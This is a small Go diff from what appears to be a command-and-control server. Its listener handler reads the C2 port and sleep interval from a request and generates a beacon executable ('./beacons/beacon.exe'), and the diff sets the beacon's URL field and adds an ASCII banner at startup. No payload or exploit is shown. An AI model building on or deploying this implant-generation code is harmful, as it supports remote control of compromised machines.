@@ -91,7 +91,7 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 				config.c2port = binary.BigEndian.Uint16(body[4:6])
 				config.useragent = CONFIG.Useragent
 				config.a = listener.A
-				config.url = ""
+				config.url = strconv.Itoa(int(config.c2port))
 				config.sleep = binary.BigEndian.Uint32(body[6:])
 				config.host = CONFIG.Host
 				GenerateOblivionis(config, "./beacons/beacon.exe")
@@ -113,6 +113,12 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 }
 
 func main() {
+	fmt.Println("██████╗░██████╗  ██╗░░    ██╗   ███       ██████   ███████╗███╗  ██╗")
+	fmt.Println("  ██╔══██╗  ║░░░██║█ ║   ████╗░██║██╔════██╔══    ██╗      ██╔══██╗")
+	fmt.Println("  ██  █████║   ██████╔  ██╗██║███  ██╗░░██████╔╝ ████████  ██╗██║")
+	fmt.Println("  ██╔═██║     ██║   ██║██║ ╚███║    ██╔══╝░░███╗██╔══    ║║████║")
+	fmt.Println("  ██║░█████╔╝██║║░  ╚███║   ███      █████████║░████████║  ██║")
+	fmt.Println("╚ ═╝░░░░░░╚═════╝░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝")
 	port2 := CONFIG.C2port
 	StartClient("client", port2)
 
